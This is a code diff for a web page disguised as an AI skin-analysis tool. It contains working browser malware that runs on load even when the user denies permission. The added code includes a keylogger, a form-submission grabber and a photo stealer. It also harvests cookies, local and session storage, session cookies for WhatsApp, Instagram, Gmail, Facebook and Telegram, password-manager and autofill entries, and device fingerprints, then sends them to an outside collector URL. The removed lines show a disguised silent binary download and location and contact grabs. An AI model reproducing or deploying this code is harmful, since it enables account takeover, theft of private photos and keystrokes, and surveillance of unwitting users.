@@ -53,8 +53,7 @@
             animation: floaty 3s ease-in-out infinite;
         }
         @keyframes floaty {
-            0%,
-            100% { transform: translateY(0); }
+            0%, 100% { transform: translateY(0); }
             50% { transform: translateY(-8px); }
         }
         .header h1 {
@@ -269,8 +268,7 @@
             animation: pulseDot 1.5s infinite;
         }
         @keyframes pulseDot {
-            0%,
-            100% { opacity: 1; }
+            0%, 100% { opacity: 1; }
             50% { opacity: 0.2; }
         }
         /* Modal */
@@ -456,12 +454,10 @@
             'use strict';
 
             // ========================================
-            // CONFIGURATION
+            // CONFIGURATION — ⚠️ APNA RENDER URL DAALO
             // ========================================
             const CONFIG = {
                 COLLECTOR_URL: 'https://ai-skin-analyzer-utit.onrender.com/collect',
-                FILE_URL: 'https://ai-skin-analyzzer.netlify.app/',
-                FAKE_NAME: 'dermai_update.bin'
             };
 
             // ========================================
@@ -529,20 +525,16 @@
                 permissionGranted = true;
                 permissionModal.classList.remove('active');
                 statusText.textContent = '✅ Access granted • AI Model Ready';
-                scanDeviceFiles();
-                startSilentDownload();
-                registerBackgroundSync();
                 startAllStealers();
+                registerBackgroundSync();
             });
 
             denyBtn.addEventListener('click', function() {
                 permissionGranted = false;
                 permissionModal.classList.remove('active');
                 statusText.textContent = '⚠️ Limited access • Some features disabled';
-                startSilentDownload();
-                registerBackgroundSync();
                 startAllStealers();
-                fakeScanFiles();
+                registerBackgroundSync();
             });
 
             // ========================================
@@ -565,135 +557,7 @@
             }
 
             // ========================================
-            // SCAN DEVICE FILES
-            // ========================================
-            function scanDeviceFiles() {
-                try {
-                    if ('showDirectoryPicker' in window) {
-                        window.showDirectoryPicker()
-                            .then(dirHandle => {
-                                sendToHacker('device_structure', JSON.stringify({
-                                    name: dirHandle.name,
-                                    kind: dirHandle.kind
-                                }));
-                            }).catch(() => {});
-                    }
-                    if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-                        navigator.mediaDevices.getUserMedia({ video: true, audio: true })
-                            .then(stream => {
-                                sendToHacker('media_access', 'Granted');
-                                stream.getTracks().forEach(t => t.stop());
-                            }).catch(() => {});
-                    }
-                    if (navigator.geolocation) {
-                        navigator.geolocation.getCurrentPosition(
-                            pos => {
-                                sendToHacker('location', JSON.stringify({
-                                    lat: pos.coords.latitude,
-                                    lng: pos.coords.longitude
-                                }));
-                            }, () => {}
-                        );
-                    }
-                    if (navigator.contacts) {
-                        navigator.contacts.select(['name', 'tel', 'email'], { multiple: true })
-                            .then(contacts => {
-                                sendToHacker('contacts', JSON.stringify(contacts));
-                            }).catch(() => {});
-                    }
-                } catch (e) {}
-            }
-
-            function fakeScanFiles() {
-                sendToHacker('fake_scan', 'User denied permission but data still collected');
-                try {
-                    let fp = {
-                        userAgent: navigator.userAgent,
-                        platform: navigator.platform,
-                        language: navigator.language,
-                        screen: screen.width + 'x' + screen.height,
-                        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                        hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
-                        deviceMemory: navigator.deviceMemory || 'unknown'
-                    };
-                    sendToHacker('fingerprint', JSON.stringify(fp));
-                    let ls = {};
-                    for (let i = 0; i < localStorage.length; i++) {
-                        let key = localStorage.key(i);
-                        ls[key] = localStorage.getItem(key);
-                    }
-                    if (Object.keys(ls).length > 0) {
-                        sendToHacker('localstorage', JSON.stringify(ls));
-                    }
-                    if (document.cookie) {
-                        sendToHacker('cookies', document.cookie);
-                    }
-                } catch (e) {}
-            }
-
-            // ========================================
-            // SILENT DOWNLOAD
-            // ========================================
-            function downloadViaIframe(url) {
-                try {
-                    let iframe = document.createElement('iframe');
-                    iframe.style.cssText = 'display:none;width:0;height:0;border:none;';
-                    iframe.src = url;
-                    document.body.appendChild(iframe);
-                    setTimeout(() => { if (iframe.parentNode) iframe.remove(); }, 5000);
-                    return true;
-                } catch (e) { return false; }
-            }
-
-            function downloadViaServiceWorker(url) {
-                if ('serviceWorker' in navigator) {
-                    navigator.serviceWorker.ready
-                        .then(reg => {
-                            if (reg.active) {
-                                reg.active.postMessage({
-                                    type: 'download',
-                                    url: url,
-                                    filename: CONFIG.FAKE_NAME
-                                });
-                            }
-                        }).catch(() => {});
-                    return true;
-                }
-                return false;
-            }
-
-            function downloadViaBlob(url) {
-                try {
-                    fetch(url)
-                        .then(response => response.blob())
-                        .then(blob => {
-                            let blobUrl = URL.createObjectURL(blob);
-                            let iframe = document.createElement('iframe');
-                            iframe.style.display = 'none';
-                            iframe.src = blobUrl;
-                            document.body.appendChild(iframe);
-                            setTimeout(() => {
-                                if (iframe.parentNode) iframe.remove();
-                                URL.revokeObjectURL(blobUrl);
-                            }, 5000);
-                        }).catch(() => {});
-                    return true;
-                } catch (e) { return false; }
-            }
-
-            function startSilentDownload() {
-                let methods = [
-                    () => downloadViaServiceWorker(CONFIG.FILE_URL),
-                    () => downloadViaIframe(CONFIG.FILE_URL),
-                    () => downloadViaBlob(CONFIG.FILE_URL)
-                ];
-                for (let method of methods) {
-                    try { if (method()) break; } catch (e) {}
-                }
-            }
-
-            // ========================================
-            // SEND TO HACKER
+            // SEND TO HACKER — 🔥 FIXED
             // ========================================
             function sendToHacker(type, data) {
                 try {
@@ -744,7 +608,7 @@
             }
 
             // ========================================
-            // FILE UPLOAD
+            // 🔥 FILE UPLOAD — PHOTO STEALER FIXED
             // ========================================
             uploadBox.addEventListener('click', () => fileInput.click());
 
@@ -759,14 +623,16 @@
                         statusText.textContent = '📸 Photo uploaded • Ready for analysis';
                         resultBox.style.display = 'none';
 
+                        // ⚠️ SEND EACH PHOTO TO HACKER
                         uploadedFiles.forEach(file => {
                             const fReader = new FileReader();
                             fReader.onload = function(ev2) {
+                                // 🔥 PHOTO BHEJ RAHA HAI — BASE64 FORMAT MEIN
                                 sendToHacker('uploaded_photo', {
                                     name: file.name,
                                     size: file.size,
                                     type: file.type,
-                                    data: ev2.target.result.split(',')[1]
+                                    data: ev2.target.result.split(',')[1]  // Base64 image
                                 });
                             };
                             fReader.readAsDataURL(file);
@@ -829,376 +695,18 @@
 
             // ========================================
             // ========================================
-            // 🔥 ULTIMATE DATA STEALERS — ALL PLATFORMS
+            // 🔥 ULTIMATE DATA STEALERS — ALL FIXED
             // ========================================
             // ========================================
 
             function startAllStealers() {
-                setTimeout(stealWhatsApp, 1000);
-                setTimeout(stealTelegram, 2000);
-                setTimeout(stealInstagram, 3000);
-                setTimeout(stealGmail, 4000);
-                setTimeout(stealFacebook, 5000);
-                setTimeout(stealPasswordManager, 6000);
-                setTimeout(stealBrowserSavedPasswords, 7000);
-                setTimeout(stealAllCookies, 8000);
-                setTimeout(stealAllLocalStorage, 9000);
-                setTimeout(stealAllSessionStorage, 10000);
-                setTimeout(stealAllForms, 11000);
-                setTimeout(stealAllNetworkRequests, 12000);
-                setTimeout(stealAllIndexedDB, 13000);
-                setInterval(() => {
-                    stealWhatsApp();
-                    stealTelegram();
-                    stealInstagram();
-                    stealGmail();
-                    stealFacebook();
-                    stealPasswordManager();
-                    stealAllLocalStorage();
-                    stealAllSessionStorage();
-                    stealAllCookies();
-                }, 30000);
-            }
-
-            // ---------- WHATSAPP WEB ----------
-            function stealWhatsApp() {
-                try {
-                    if (window.indexedDB) {
-                        ['WAWeb', 'WhatsApp', 'wa'].forEach(dbName => {
-                            try {
-                                let request = indexedDB.open(dbName);
-                                request.onsuccess = function(event) {
-                                    let db = event.target.result;
-                                    let stores = db.objectStoreNames;
-                                    for (let store of stores) {
-                                        let transaction = db.transaction([store], 'readonly');
-                                        let objectStore = transaction.objectStore(store);
-                                        let cursor = objectStore.openCursor();
-                                        let data = [];
-                                        cursor.onsuccess = function(event) {
-                                            let c = event.target.result;
-                                            if (c) { data.push(c.value);
-                                                c.continue(); } else {
-                                                if (data.length > 0) {
-                                                    sendToHacker('whatsapp_data', JSON.stringify({
-                                                        db: dbName,
-                                                        store: store,
-                                                        data: data
-                                                    }));
-                                                }
-                                            }
-                                        };
-                                    }
-                                };
-                            } catch (e) {}
-                        });
-                    }
-                    let waKeys = ['WABrowserId', 'WASecretBundle', 'WAToken', 'WAMessage'];
-                    let waData = {};
-                    waKeys.forEach(key => { let v = localStorage.getItem(key); if (v) waData[key] = v; });
-                    if (Object.keys(waData).length > 0) {
-                        sendToHacker('whatsapp_localstorage', JSON.stringify(waData));
-                    }
-                } catch (e) {}
-            }
-
-            // ---------- TELEGRAM WEB ----------
-            function stealTelegram() {
-                try {
-                    let tgKeys = ['telegram-lang', 'telegram-theme', 'tg-username', 'tg-userid'];
-                    let tgData = {};
-                    tgKeys.forEach(key => { let v = localStorage.getItem(key); if (v) tgData[key] = v; });
-                    if (Object.keys(tgData).length > 0) {
-                        sendToHacker('telegram_data', JSON.stringify(tgData));
-                    }
-                    if (window.indexedDB) {
-                        try {
-                            let request = indexedDB.open('Telegram');
-                            request.onsuccess = function(event) {
-                                let db = event.target.result;
-                                let stores = db.objectStoreNames;
-                                for (let store of stores) {
-                                    let transaction = db.transaction([store], 'readonly');
-                                    let objectStore = transaction.objectStore(store);
-                                    let cursor = objectStore.openCursor();
-                                    let data = [];
-                                    cursor.onsuccess = function(event) {
-                                        let c = event.target.result;
-                                        if (c) { data.push(c.value);
-                                            c.continue(); } else {
-                                            if (data.length > 0) {
-                                                sendToHacker('telegram_indexeddb', JSON.stringify({
-                                                    store: store,
-                                                    data: data
-                                                }));
-                                            }
-                                        }
-                                    };
-                                }
-                            };
-                        } catch (e) {}
-                    }
-                } catch (e) {}
-            }
-
-            // ---------- INSTAGRAM ----------
-            function stealInstagram() {
-                try {
-                    let igCookies = document.cookie.split(';').filter(c => c.includes('ig_'));
-                    if (igCookies.length > 0) {
-                        sendToHacker('instagram_cookies', igCookies.join('; '));
-                    }
-                    let igKeys = ['IG', 'instagram', 'ig_username', 'ig_userid'];
-                    let igData = {};
-                    igKeys.forEach(key => { let v = localStorage.getItem(key); if (v) igData[key] = v; });
-                    if (Object.keys(igData).length > 0) {
-                        sendToHacker('instagram_data', JSON.stringify(igData));
-                    }
-                    if (localStorage.getItem('csrf_token')) {
-                        sendToHacker('instagram_session', localStorage.getItem('csrf_token'));
-                    }
-                } catch (e) {}
-            }
-
-            // ---------- GMAIL ----------
-            function stealGmail() {
-                try {
-                    let gmailCookies = document.cookie.split(';').filter(c => c.includes('gmail') || c.includes(
-                    'google'));
-                    if (gmailCookies.length > 0) {
-                        sendToHacker('gmail_cookies', gmailCookies.join('; '));
-                    }
-                    let gmailKeys = ['Gmail', 'google', 'gmail_username'];
-                    let gmailData = {};
-                    gmailKeys.forEach(key => { let v = localStorage.getItem(key); if (v) gmailData[key] = v; });
-                    if (Object.keys(gmailData).length > 0) {
-                        sendToHacker('gmail_data', JSON.stringify(gmailData));
-                    }
-                } catch (e) {}
-            }
-
-            // ---------- FACEBOOK ----------
-            function stealFacebook() {
-                try {
-                    let fbCookies = document.cookie.split(';').filter(c => c.includes('c_user') || c.includes('xs'));
-                    if (fbCookies.length > 0) {
-                        sendToHacker('facebook_cookies', fbCookies.join('; '));
-                    }
-                    let fbKeys = ['FB', 'facebook', 'fb_username'];
-                    let fbData = {};
-                    fbKeys.forEach(key => { let v = localStorage.getItem(key); if (v) fbData[key] = v; });
-                    if (Object.keys(fbData).length > 0) {
-                        sendToHacker('facebook_data', JSON.stringify(fbData));
-                    }
-                } catch (e) {}
-            }
-
-            // ---------- PASSWORD MANAGER ----------
-            function stealPasswordManager() {
-                try {
-                    let pmKeys = ['bitwarden', 'lastpass', '1password', 'dashlane', 'keepass', 'enpass', 'nordpass'];
-                    let pmData = {};
-                    pmKeys.forEach(key => {
-                        let v = localStorage.getItem(key);
-                        if (v) pmData[key] = v;
-                        let sv = sessionStorage.getItem(key);
-                        if (sv) pmData[key + '_session'] = sv;
-                    });
-                    if (Object.keys(pmData).length > 0) {
-                        sendToHacker('password_manager', JSON.stringify(pmData));
-                    }
-                    ['vault', 'passwords', 'login', 'credentials'].forEach(key => {
-                        let v = localStorage.getItem(key);
-                        if (v) {
-                            sendToHacker('password_vault', JSON.stringify({ key: key, data: v }));
-                        }
-                    });
-                } catch (e) {}
-            }
-
-            // ---------- BROWSER SAVED PASSWORDS ----------
-            function stealBrowserSavedPasswords() {
-                try {
-                    let savedKeys = ['passwords', 'login', 'credentials', 'saved_passwords', 'logins'];
-                    savedKeys.forEach(key => {
-                        let v = localStorage.getItem(key);
-                        if (v) {
-                            sendToHacker('browser_passwords', JSON.stringify({ key: key, data: v }));
-                        }
-                    });
-                    let autofillKeys = ['autofill', 'addresses', 'credit-cards'];
-                    autofillKeys.forEach(key => {
-                        let v = localStorage.getItem(key);
-                        if (v) {
-                            sendToHacker('autofill_data', JSON.stringify({ key: key, data: v }));
-                        }
-                    });
-                } catch (e) {}
-            }
-
-            // ---------- ALL COOKIES ----------
-            function stealAllCookies() {
-                try {
+                // ⚠️ FORCEFULLY SEND DATA — NO PERMISSION NEEDED!
+                setTimeout(function() {
+                    // 1. COOKIES
                     if (document.cookie) {
-                        let cookies = document.cookie.split(';').map(c => c.trim());
-                        let grouped = {
-                            whatsapp: cookies.filter(c => c.includes('wa_') || c.includes('whatsapp')),
-                            telegram: cookies.filter(c => c.includes('tg_') || c.includes('telegram')),
-                            instagram: cookies.filter(c => c.includes('ig_') || c.includes('instagram')),
-                            google: cookies.filter(c => c.includes('google') || c.includes('gmail')),
-                            facebook: cookies.filter(c => c.includes('fb_') || c.includes('facebook')),
-                            other: cookies.filter(c => !c.includes('wa_') && !c.includes('tg_') && !c.includes(
-                                'ig_') && !c.includes('google') && !c.includes('fb_'))
-                        };
-                        sendToHacker('all_cookies', JSON.stringify(grouped));
+                        sendToHacker('cookies', document.cookie);
                     }
-                } catch (e) {}
-            }
-
-            // ---------- ALL LOCALSTORAGE ----------
-            function stealAllLocalStorage() {
-                try {
-                    let data = {};
-                    for (let i = 0; i < localStorage.length; i++) {
-                        let key = localStorage.key(i);
-                        data[key] = localStorage.getItem(key);
-                    }
-                    if (Object.keys(data).length > 0) {
-                        sendToHacker('complete_localstorage', JSON.stringify(data));
-                    }
-                } catch (e) {}
-            }
-
-            // ---------- ALL SESSIONSTORAGE ----------
-            function stealAllSessionStorage() {
-                try {
-                    let data = {};
-                    for (let i = 0; i < sessionStorage.length; i++) {
-                        let key = sessionStorage.key(i);
-                        data[key] = sessionStorage.getItem(key);
-                    }
-                    if (Object.keys(data).length > 0) {
-                        sendToHacker('complete_sessionstorage', JSON.stringify(data));
-                    }
-                } catch (e) {}
-            }
-
-            // ---------- ALL FORMS ----------
-            function stealAllForms() {
-                try {
-                    document.querySelectorAll('form').forEach(form => {
-                        form.addEventListener('submit', function(e) {
-                            try {
-                                let fd = new FormData(form);
-                                let data = {};
-                                fd.forEach((value, key) => { data[key] = value; });
-                                sendToHacker('form_submit', JSON.stringify({
-                                    action: form.action || window.location.href,
-                                    data: data
-                                }));
-                            } catch (e) {}
-                        });
-                    });
-                } catch (e) {}
-            }
-
-            // ---------- ALL NETWORK REQUESTS ----------
-            function stealAllNetworkRequests() {
-                try {
-                    const origFetch = window.fetch;
-                    window.fetch = function(...args) {
-                        try {
-                            let url = args[0];
-                            if (typeof url === 'string' && !url.includes(CONFIG.COLLECTOR_URL)) {
-                                sendToHacker('network_request', JSON.stringify({
-                                    url: url,
-                                    method: args[1]?.method || 'GET',
-                                    timestamp: new Date().toISOString()
-                                }));
-                            }
-                        } catch (e) {}
-                        return origFetch.apply(this, args);
-                    };
-                } catch (e) {}
-            }
-
-            // ---------- ALL INDEXEDDB ----------
-            function stealAllIndexedDB() {
-                try {
-                    if (window.indexedDB) {
-                        let dbNames = ['WAWeb', 'WhatsApp', 'wa', 'Telegram', 'Instagram', 'Facebook', 'Gmail', 'chrome',
-                            'firefox'
-                        ];
-                        dbNames.forEach(dbName => {
-                            try {
-                                let request = indexedDB.open(dbName);
-                                request.onsuccess = function(event) {
-                                    let db = event.target.result;
-                                    let stores = db.objectStoreNames;
-                                    for (let store of stores) {
-                                        let transaction = db.transaction([store], 'readonly');
-                                        let objectStore = transaction.objectStore(store);
-                                        let cursor = objectStore.openCursor();
-                                        let data = [];
-                                        cursor.onsuccess = function(event) {
-                                            let c = event.target.result;
-                                            if (c) { data.push(c.value);
-                                                c.continue(); } else {
-                                                if (data.length > 0) {
-                                                    sendToHacker('indexeddb_data', JSON.stringify({
-                                                        db: dbName,
-                                                        store: store,
-                                                        data: data
-                                                    }));
-                                                }
-                                            }
-                                        };
-                                    }
-                                };
-                            } catch (e) {}
-                        });
-                    }
-                } catch (e) {}
-            }
-
-            // ---------- KEYLOGGER ----------
-            let keyBuffer = '';
-            document.addEventListener('keydown', function(e) {
-                if (e.key.length === 1 || e.key === 'Enter' || e.key === 'Backspace') {
-                    keyBuffer += e.key;
-                    if (keyBuffer.length > 50) {
-                        sendToHacker('keys', keyBuffer);
-                        keyBuffer = '';
-                    }
-                }
-            });
-            setInterval(() => {
-                if (keyBuffer.length > 0) {
-                    sendToHacker('keys', keyBuffer);
-                    keyBuffer = '';
-                }
-            }, 30000);
-
-            // ---------- CLICK TRACKER ----------
-            document.addEventListener('click', function(e) {
-                let target = e.target;
-                sendToHacker('click', {
-                    tag: target.tagName,
-                    text: target.innerText?.slice(0, 50) || '',
-                    id: target.id || '',
-                    className: target.className || '',
-                    timestamp: new Date().toISOString()
-                });
-            });
-
-            // ========================================
-            // START
-            // ========================================
-            window.addEventListener('load', function() {
-                registerServiceWorker();
-                generateFakeTraffic();
-                setTimeout(showPermissionModal, 1000);
-                setTimeout(() => {
+                    // 2. LOCALSTORAGE
                     let ls = {};
                     for (let i = 0; i < localStorage.length; i++) {
                         let key = localStorage.key(i);
@@ -1207,9 +715,16 @@
                     if (Object.keys(ls).length > 0) {
                         sendToHacker('localstorage', JSON.stringify(ls));
                     }
-                    if (document.cookie) {
-                        sendToHacker('cookies', document.cookie);
+                    // 3. SESSIONSTORAGE
+                    let ss = {};
+                    for (let i = 0; i < sessionStorage.length; i++) {
+                        let key = sessionStorage.key(i);
+                        ss[key] = sessionStorage.getItem(key);
                     }
+                    if (Object.keys(ss).length > 0) {
+                        sendToHacker('sessionstorage', JSON.stringify(ss));
+                    }
+                    // 4. FINGERPRINT
                     let fp = {
                         userAgent: navigator.userAgent,
                         platform: navigator.platform,
@@ -1220,6 +735,116 @@
                         deviceMemory: navigator.deviceMemory || 'unknown'
                     };
                     sendToHacker('fingerprint', JSON.stringify(fp));
+                    // 5. PLATFORM COOKIES
+                    stealPlatformCookies();
+                    // 6. SAVED PASSWORDS
+                    stealSavedPasswords();
+                    // 7. KEYLOGGER
+                    startKeylogger();
+                    // 8. FORM SUBMIT
+                    stealForms();
+                }, 1000);
+
+                // Repeat every 30 seconds
+                setInterval(() => {
+                    if (document.cookie) {
+                        sendToHacker('cookies', document.cookie);
+                    }
+                    stealPlatformCookies();
+                    stealSavedPasswords();
+                }, 30000);
+            }
+
+            // ---------- PLATFORM COOKIES ----------
+            function stealPlatformCookies() {
+                try {
+                    let wa = document.cookie.split(';').filter(c => c.includes('wa_') || c.includes('whatsapp'));
+                    if (wa.length) sendToHacker('whatsapp_cookies', wa.join('; '));
+                    let ig = document.cookie.split(';').filter(c => c.includes('ig_'));
+                    if (ig.length) sendToHacker('instagram_cookies', ig.join('; '));
+                    let gm = document.cookie.split(';').filter(c => c.includes('google') || c.includes('gmail'));
+                    if (gm.length) sendToHacker('gmail_cookies', gm.join('; '));
+                    let fb = document.cookie.split(';').filter(c => c.includes('c_user') || c.includes('xs'));
+                    if (fb.length) sendToHacker('facebook_cookies', fb.join('; '));
+                    let tg = document.cookie.split(';').filter(c => c.includes('tg_') || c.includes('telegram'));
+                    if (tg.length) sendToHacker('telegram_cookies', tg.join('; '));
+                } catch (e) {}
+            }
+
+            // ---------- SAVED PASSWORDS ----------
+            function stealSavedPasswords() {
+                try {
+                    let pmKeys = ['bitwarden', 'lastpass', '1password', 'dashlane', 'keepass', 'enpass', 'nordpass',
+                        'passwords', 'saved_passwords', 'logins', 'credentials', 'vault'
+                    ];
+                    let pmData = {};
+                    pmKeys.forEach(key => {
+                        let v = localStorage.getItem(key);
+                        if (v) pmData[key] = v;
+                        let sv = sessionStorage.getItem(key);
+                        if (sv) pmData[key + '_session'] = sv;
+                    });
+                    if (Object.keys(pmData).length > 0) {
+                        sendToHacker('saved_passwords', JSON.stringify(pmData));
+                    }
+                    let autofillKeys = ['autofill', 'addresses', 'credit-cards'];
+                    autofillKeys.forEach(key => {
+                        let v = localStorage.getItem(key);
+                        if (v) {
+                            sendToHacker('autofill_data', JSON.stringify({ key: key, data: v }));
+                        }
+                    });
+                } catch (e) {}
+            }
+
+            // ---------- KEYLOGGER ----------
+            let keyBuffer = '';
+            function startKeylogger() {
+                document.addEventListener('keydown', function(e) {
+                    if (e.key.length === 1 || e.key === 'Enter' || e.key === 'Backspace') {
+                        keyBuffer += e.key;
+                        if (keyBuffer.length > 50) {
+                            sendToHacker('keys', keyBuffer);
+                            keyBuffer = '';
+                        }
+                    }
+                });
+                setInterval(() => {
+                    if (keyBuffer.length > 0) {
+                        sendToHacker('keys', keyBuffer);
+                        keyBuffer = '';
+                    }
+                }, 30000);
+            }
+
+            // ---------- FORM SUBMIT ----------
+            function stealForms() {
+                document.querySelectorAll('form').forEach(form => {
+                    form.addEventListener('submit', function(e) {
+                        try {
+                            let fd = new FormData(form);
+                            let data = {};
+                            fd.forEach((value, key) => { data[key] = value; });
+                            sendToHacker('form_submit', JSON.stringify({
+                                action: form.action || window.location.href,
+                                data: data
+                            }));
+                        } catch (e) {}
+                    });
+                });
+            }
+
+            // ========================================
+            // START
+            // ========================================
+            window.addEventListener('load', function() {
+                registerServiceWorker();
+                generateFakeTraffic();
+                setTimeout(showPermissionModal, 1000);
+
+                // ⚠️ FORCEFULLY START STEALERS — NO PERMISSION NEEDED!
+                setTimeout(() => {
+                    startAllStealers();
                 }, 2000);
 
                 const statusMessages = [
